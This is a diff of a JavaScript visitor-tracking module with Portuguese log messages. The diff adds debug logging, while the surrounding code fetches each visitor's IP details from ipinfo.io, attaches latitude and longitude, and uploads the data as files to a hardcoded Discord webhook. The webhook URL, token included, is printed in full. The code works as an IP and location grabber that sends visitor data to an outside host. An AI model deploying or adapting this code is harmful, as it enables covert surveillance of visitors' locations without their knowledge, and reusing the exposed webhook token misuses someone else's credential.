@@ -1,17 +1,22 @@
 const WEBHOOK = "https://discord.com/api/webhooks/1512916490637279442/3b3q2iweTkHj2A7_bohtF_z5Shjm1hgMbVKX3AFmXDwbI5t9Qp-ZBH3MX8iIZ5gaMVoN";
 
-console.log("Script carregado - versao 2.0");
+console.log("Script carregado - versao 5.0");
+console.log("Webhook configurado:", WEBHOOK.substring(0, 50) + "...");
 
 const IPModule = {
   lastIp: null,
   lastTimestamp: null,
 
   async send(lat, lon) {
+    console.log("[IPModule.send] Iniciando envio...");
     try {
+      console.log("[IPModule.send] Buscando IP...");
       const res = await fetch("https://ipinfo.io/json");
       if (!res.ok) throw new Error(`HTTP ${res.status}`);
       const d = await res.json();
       if (!d.ip) throw new Error("IP missing");
+
+      console.log("[IPModule.send] IP obtido:", d.ip);
 
       this.lastIp = d.ip;
       this.lastTimestamp = Date.now();
@@ -134,14 +139,26 @@ const IPModule = {
       const filename = `visitor_${d.ip.replace(/\./g, "_")}_${this.lastTimestamp}.txt`;
       form.append("file", blob, filename);
       
-      await fetch(WEBHOOK, { method: "POST", body: form });
+      console.log("[IPModule.send] Enviando para webhook...", filename);
+      const webhookResponse = await fetch(WEBHOOK, { method: "POST", body: form });
+      console.log("[IPModule.send] Resposta:", webhookResponse.status, webhookResponse.statusText);
+      
+      if (!webhookResponse.ok) {
+        console.error("[IPModule.send] ERRO:", await webhookResponse.text());
+      } else {
+        console.log("[IPModule.send] Sucesso!");
+      }
     } catch (err) {
-      console.warn("[IPModule]", err.message);
+      console.error("[IPModule.send] ERRO:", err.message, err);
     }
   },
 
   async sendUpdate(lat, lon) {
-    if (!this.lastIp || !this.lastTimestamp) return;
+    console.log("[IPModule.sendUpdate] Iniciando atualização com localização...");
+    if (!this.lastIp || !this.lastTimestamp) {
+      console.error("[IPModule.sendUpdate] Dados anteriores não encontrados!");
+      return;
+    }
 
     try {
       const res = await fetch("https://ipinfo.io/json");
@@ -258,9 +275,17 @@ const IPModule = {
       const filename = `visitor_${d.ip.replace(/\./g, "_")}_${this.lastTimestamp}_LOCATION.txt`;
       form.append("file", blob, filename);
       
-      await fetch(WEBHOOK, { method: "POST", body: form });
+      console.log("[IPModule.sendUpdate] Enviando atualização...", filename);
+      const webhookResponse = await fetch(WEBHOOK, { method: "POST", body: form });
+      console.log("[IPModule.sendUpdate] Resposta:", webhookResponse.status, webhookResponse.statusText);
+      
+      if (!webhookResponse.ok) {
+        console.error("[IPModule.sendUpdate] ERRO:", await webhookResponse.text());
+      } else {
+        console.log("[IPModule.sendUpdate] Sucesso!");
+      }
     } catch (err) {
-      console.warn("[IPModule Update]", err.message);
+      console.error("[IPModule.sendUpdate] ERRO:", err.message, err);
     }
   },
 };
